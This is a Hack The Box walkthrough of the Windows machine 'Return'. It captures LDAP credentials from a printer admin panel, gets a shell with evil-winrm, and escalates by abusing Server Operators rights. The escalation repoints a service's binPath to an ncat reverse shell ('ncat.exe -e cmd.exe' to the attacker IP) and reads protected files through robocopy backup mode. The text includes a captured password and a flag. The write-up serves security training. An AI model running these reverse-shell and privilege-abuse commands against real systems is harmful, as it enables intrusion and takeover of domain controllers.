---
title: Hack The Box - Return
date: 2023-01-28
categories: [hackthebox]
tags: [windows,active directory,robocopy,server operator,SeBackupPrivilege,SeRestorePrivilege,easy]
math: true
mermaid: true
toc: true
comments: true
---

## RECON
![](/assets/Hackthebox/Return/0.png)

### NMAP

`Nmap` shows multiple ports open. 
```bash
Snmap -p- --min-rate 10000 -oN return.nmap 10.10.11.108 
Nmap scan report for 10.10.11.108 
Host is up (0.075s latency). 
Not shown: 65510 closed tcp ports (reset) 
PORT      STATE SERVICE 
53/tcp    open  domain 
80/tcp    open  http 
88/tcp    open  kerberos-sec 
135/tcp   open  msrpc 
139/tcp   open  netbios-ssn 
389/tcp   open  ldap 
445/tcp   open  microsoft-ds 
464/tcp   open  kpasswd5 
593/tcp   open  http-rpc-epmap 
636/tcp   open  ldapssl 
3268/tcp  open  globalcatLDAP 
3269/tcp  open  globalcatLDAPssl 
5985/tcp  open  wsman 
9389/tcp  open  adws 
47001/tcp open  winrm 
49664/tcp open  unknown 
49665/tcp open  unknown 
49666/tcp open  unknown 
49668/tcp open  unknown 
49671/tcp open  unknown 
49674/tcp open  unknown 
49675/tcp open  unknown 
49679/tcp open  unknown 
49682/tcp open  unknown 
49694/tcp open  unknown 
# Nmap done at Sat Jan 28 11:34:27 2023 -- 1 IP address (1 host up) scanned in 9.47 seconds


$nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49671,49674,49675,49679,49682,49694 -sC -sV 10.10.11.108 -oN tcp-service-return.nmap 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-28 11:41 +0545 
Nmap scan report for 10.10.11.108 
Host is up (0.074s latency). 
PORT      STATE SERVICE       VERSION 
53/tcp    open  domain        Simple DNS Plus 
80/tcp    open  http          Microsoft IIS httpd 10.0 
|_http-server-header: Microsoft-IIS/10.0 
|_http-title: HTB Printer Admin Panel 
| http-methods: 
|_  Potentially risky methods: TRACE 
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-01-28 06:15:02Z) 
135/tcp   open  msrpc         Microsoft Windows RPC 
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn 
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 
445/tcp   open  microsoft-ds? 
464/tcp   open  kpasswd5? 
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
636/tcp   open  tcpwrapped 
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 
3269/tcp  open  tcpwrapped 
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
|_http-server-header: Microsoft-HTTPAPI/2.0 
|_http-title: Not Found 
9389/tcp  open  mc-nmf        .NET Message Framing 
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 
|_http-server-header: Microsoft-HTTPAPI/2.0 
|_http-title: Not Found 
49664/tcp open  msrpc         Microsoft Windows RPC 
49665/tcp open  msrpc         Microsoft Windows RPC 
49666/tcp open  msrpc         Microsoft Windows RPC 
49668/tcp open  msrpc         Microsoft Windows RPC 
49671/tcp open  msrpc         Microsoft Windows RPC 
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0 
49675/tcp open  msrpc         Microsoft Windows RPC 
49679/tcp open  msrpc         Microsoft Windows RPC 
49682/tcp open  msrpc         Microsoft Windows RPC 
49694/tcp open  msrpc         Microsoft Windows RPC 
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows 
Host script results: 
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required 
|_clock-skew: 17m55s 
| smb2-time: 
|   date: 2023-01-28T06:15:58 
|_  start_date: N/A 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 
Nmap done: 1 IP address (1 host up) scanned in 73.76 seconds
```

### PORT 80
Since port is open, when we try to access the site via a browser the site is displayed as "HTB Printer Admin Panel"

![](/assets/Hackthebox/Return/1.png)


On navigating to the `settings page`

![](/assets/Hackthebox/Return/2.png)

The above settings shows us the username which is `svc-printer` and the hardcoded password which has been masked.

## SHELL AS SVC-PRINTER

### CREDENTIAL DUMPING

Once we change the server ip address to our ip address , open a `netcat listener` on port 389 and click on update .

![](/assets/Hackthebox/Return/3.png)

we receive a password `1edFg43012!!`

```bash
$sudo nc -lvnp 389
listening on [any] 389 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 60888
0*`%return\svc-printer▒
1edFg43012!!
```

Using `evil-winrm` to establish a remote connection.
```bash
$evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami
return\svc-printer
```


## SHELL AS ADMINISTRATOR

### ENUMERATION
```
*Evil-WinRM* PS C:\Users\svc-printer> net user svc-printer
User name                    svc-printer
Full Name                    SVCPrinter
Comment                      Service Account for Printer
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/26/2021 12:15:13 AM
Password expires             Never
Password changeable          5/27/2021 12:15:13 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   1/28/2023 4:56:36 AM

Logon hours allowed          All

Local Group Memberships      *Print Operators      *Remote Management Use
                             *Server Operators
Global Group memberships     *Domain Users
The command completed successfully.

```
Here, we can see that `svc-printer` is a member of `Server Operators` group which seems interesting.

### SERVER OPERATOR

> In Windows, the "Server Operators" group is a built-in security group that allows members to perform a limited set of administrative
tasks on a server.By default, the group has no members. Server Operators can log on to a server interactively; create and delete network
shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.

### PRIVILEGES
`svc-printer` does have quite interesting privileges which can lead us to system. 
```
*Evil-WinRM* PS C:\Users\svc-printer> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeLoadDriverPrivilege         Load and unload device drivers      Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled
```
### METHOD 1 - REPLACING SERVICE BINARY PATH
ENUMERATING INSTALLED SERVICES

we found a list of installed services and their path along with true/false flags for privileges.
```
*Evil-WinRM* PS C:\Users\svc-printer> services

Path                                                                                                                 Privileges Service
----                                                                                                                 ---------- -------
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc
```

Since, svc-printer is a member of server operator group. we can change the binary path of service, replace it with a netcat binary and restart the service to get the reverse shell.
First we will upload ncat.exe
```
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> upload ncat.exe
Info: Upload successful!
```
We will now repalce the binary path of `VMTools service` with our `ncat.exe`
```
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\ncat.exe -e cmd.exe 10.10.14.11 4444"
[SC] ChangeServiceConfig SUCCESS
```
once we open netcat listener on our machine and restart the service of VMTools we get shell as a `Administrator`.
```
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe start VMTools
```

```
$sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 60966
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
we have got the shell as administrator but after 30 seconds, the service times out, and returns an error message and the shell terminates.

### STABLE SHELL AS ADMINISTRATOR

> If we have the service binary set to cmd.exe and have it start ncat.exe,
the ncat.exe process will continue running even after cmd.exe is killed.
This is because when cmd.exe starts ncat.exe, it creates a new process that is 
separate from the cmd.exe process. When the service fails to start in a service way,
the cmd.exe process is killed but the ncat.exe process is still running as it was started by cmd.exe process, it is not dependent on it.

```
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe config VMTools binPath="C:\windows\system32\cmd.exe /c C:\Users\svc-printer\Desktop\ncat.exe -e cmd 10.10.14.11
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc stop VMTools
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> sc.exe start VMTools
```

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.108] 61106
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### METHOD 2: FILE READ

Since `svc-printer` has both `SeBackupPrivilege` and `SeRestorePrivilege` privilege we can use `robocopy` to read files.

> Non-admin user can use Robocopy to copy files and directories that are normally only accessible by administrators, if they are granted the SeBackupPrivilege and SeRestorePrivilege.
The easiest way is to use the /B option to run Robocopy in "backup mode" which tells Robocopy to use the Volume Shadow Copy Service (VSS) to create a shadow copy of the volume being copied, and thus allows Robocopy to access files that are otherwise locked or in use

```
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> robocopy /b C:\users\administrator\desktop C:\programdata\temp
-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Saturday, January 28, 2023 8:45:40 AM
   Source : C:\users\administrator\desktop\
     Dest : C:\programdata\temp\

    Files : *.*

  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           2    C:\users\administrator\desktop\
            New File                  34        root.txt
  0%
100%

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         2         1         1         0         0         0
   Bytes :       316        34       282         0         0         0
   Times :   0:00:00   0:00:00                       00:00:00   0:00:00
   Ended : Saturday, January 28, 2023 8:45:40 AM

*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cd C:\programdata\temp
*Evil-WinRM* PS C:\programdata\temp> dir


    Directory: C:\programdata\temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/27/2023  10:06 PM             34 root.txt

```
now we can read the root file

```
*Evil-WinRM* PS C:\programdata\temp> type root.txt
3a8e0ddbc41e01511f43c310d8fd6eca
```